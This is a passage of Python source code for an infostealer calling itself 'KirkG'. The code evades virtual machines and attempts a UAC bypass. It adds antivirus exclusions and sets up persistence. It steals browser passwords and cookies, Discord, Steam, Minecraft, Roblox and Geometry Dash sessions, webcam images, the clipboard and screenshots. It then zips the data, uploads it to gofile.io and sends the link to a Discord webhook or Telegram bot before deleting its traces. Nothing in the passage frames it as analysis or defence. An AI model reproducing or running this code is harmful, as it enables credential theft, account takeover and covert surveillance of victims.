    kirkpath = os.getenv('appdata') + '\\charliekirk'
    try:
        os.makedirs(kirkpath, exist_ok=True)
        return kirkpath
    except:
        return None

def collectgeometrydash():
    global gd_session

    if config.games:
        gdpath = os.path.join(os.getenv('localappdata'), 'GeometryDash', 'CCGameManager.dat')
        gdlevelpath = os.path.join(os.getenv('localappdata'), 'GeometryDash', 'CCLocalLevels.dat')
        gdoutput = os.path.join(output, 'Geometry Dash')
        os.makedirs(gdoutput, exist_ok=True)
        if os.path.exists(gdpath):
            try:
                shutil.copy2(gdpath, os.path.join(gdoutput, os.path.basename(gdpath)))
                gd_session = 1
            except:
                pass
            
            try:
                write(os.path.join(gdoutput, 'note.txt'), 'I recommend using https://gdcolon.com/gdsave/ if you wanna get data from the save files, otherwise just replace your geometry dash save files with the one shown here')
            except Exception as e:
                print('Failed to write', e)
                pass
        if os.path.exists(gdlevelpath):
            try:
                shutil.copy2(gdlevelpath, os.path.join(gdoutput, os.path.basename(gdlevelpath)))
            except:
                pass


def collectsteam():
    if config.games:
        global steam_session
        steampath = os.path.join(os.getenv('programfiles(x86)'), 'Steam')
        loginpaath = os.path.join(steampath, 'config', 'loginusers.vdf')
        cfgpath = os.path.join(steampath, 'config', 'config.vdf')
        steamoutput = os.path.join(output, 'Steam')
        if os.path.exists(steampath):
            try:
                os.makedirs(steamoutput, exist_ok=True)
                shutil.copy2(loginpaath, os.path.join(steamoutput, os.path.basename(loginpaath)))
                shutil.copy2(cfgpath, os.path.join(steamoutput, os.path.basename(cfgpath)))
                steam_session = 1
            except:
                pass

appdpath = makepath()
if appdpath:
    copypath = appdpath + '\\dakirk.exe'
else:
    copypath = sys.executable
is_vm = anti_vm()

if config.antivm:
    if is_vm:
        sys.exit(0)

if not isadmin():
    if config.uacbypass:
        if GetSelf()[1]:
            try:
                if UACbypass():
                    os._exit(0)
                    bypass_success = 1
            except:
                if UACbypass(1):
                    os._exit(0)
                    bypass_success = 1
            else: askforadmin()
        else:
            askforadmin()
    else: askforadmin()

e1 = threading.Thread(target=exclusion, args=(sys.executable,))
e1.start()

e2 = threading.Thread(target=exclusion, args=(copypath,))
e2.start()

e3 = threading.Thread(target=exclusion, args=(os.getenv('userprofile'),))
e3.start()

#exclusion(sys.executable)
#exclusion(copypath)
#exclusion(os.getenv('userprofile'))

thread = threading.Thread(target=persistence, args=(copypath,))
thread.start()
funcs = [systeminfo, get_webcam, get_clipboard, screenshot, kill, stealchromium, stealchromiumv20, stealgecko, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus]
# systeminfo()
# screenshot()
# kill()
# stealchromium()
# stealgecko()
# stealdiscordacc()
# collectminecraft()
# collectsteam()


threads = []
for fn in funcs:
    t = threading.Thread(target=fn, daemon=True)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

collectroblox()
zip_folder(output, zip_)


    
    
def sendtoc2(file):
    print(gd_session)
    stores = ['store1', 'store2', 'store3', 'store4', 'store5']
    with open(file, 'rb') as f:
        for store in stores:
            f.seek(0)
            upload = requests.post(f'https://{store}.gofile.io/uploadFile', files={'file': f})
            if upload.status_code in [200, 201, 204]:
                uj = upload.json()
                #print(upload.text)
                #print(uj)
                #print(upload.status_code)
                download = uj['data']['downloadPage']
                break
            else:
                continue
    if config.type == "discord":
        webhookurl = config.hook
        
        payload = {
          "content": "@everyone",
          "embeds": [
            {
              "title": "GOD BLESS AMERICA",
              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nTotal Processes: {str(process_count)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD Sessions: {'Yes' if gd_session == 1 else 'No'}\nRoblox Cookies: {str(roblox_cookies)}\nWebcam: {'Yes' if webcam_success == 1 else 'No'}\nClipboard: {'Yes' if clipboard_success == 1 else 'No'}\nSystem Info: {'Yes' if system_info == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)}\nVM: {'Yes' if is_vm else 'No'}\nUAC Bypass: {'Yes' if bypass_success else 'No'}\n```\n\ncreds: ||{download}||",
              "color": 3866871,
              "author": {
                "name": "KirkG"
              },
              "thumbnail": {
                "url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvdHVybmluZ3BvaW50LmpwZw==").decode('utf-8')
              }
            }
          ],
          "username": "Charlie Kirk",
          "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvY2hhcmxpZSUyMGtpcmsuanBn").decode('utf-8')
    }
        r = requests.post(webhookurl, json=payload)
        # print(r.text)
    
    if config.type == "telegram":
        chat_id = config.tg_chat
        token = config.tg_token

        msg = f'''GOD BLESS AMERICA I AM CHARLIE KIRK
Total Cookies: {str(cookie_count)}
Total Passwords: {str(password_count)}
Total Autofills: {str(autofill_count)}
Total History: {str(browsing_history)}
Total Discord Accounts: {str(discord_accounts)}
Total Minecraft Sessions: {str(minecraft_sessions)}
Total Processes: {str(process_count)}
Steam Session: {'Yes' if steam_session == 1 else 'No'}
GD Sessions: {'Yes' if gd_session == 1 else 'No'}
Roblox Cookies: {str(roblox_cookies)}
Webcam: {'Yes' if webcam_success == 1 else 'No'}
Clipboard: {'Yes' if clipboard_success == 1 else 'No'}
System Info: {'Yes' if system_info == 1 else 'No'}
Screenshot: {"Yes" if ss_success == 1 else "No"}
Wi-Fi Networks: {str(wifiprofiles)}
VM: {'Yes' if is_vm else 'No'}
UAC Bypass: {'Yes' if bypass_success else 'No'}
Credentials: {download}
        '''
        payload = {
            'chat_id': chat_id,
            'text': msg
        }
        r = requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data=payload)
sendtoc2(zip_)

removefile(zip_)
removedir(output)
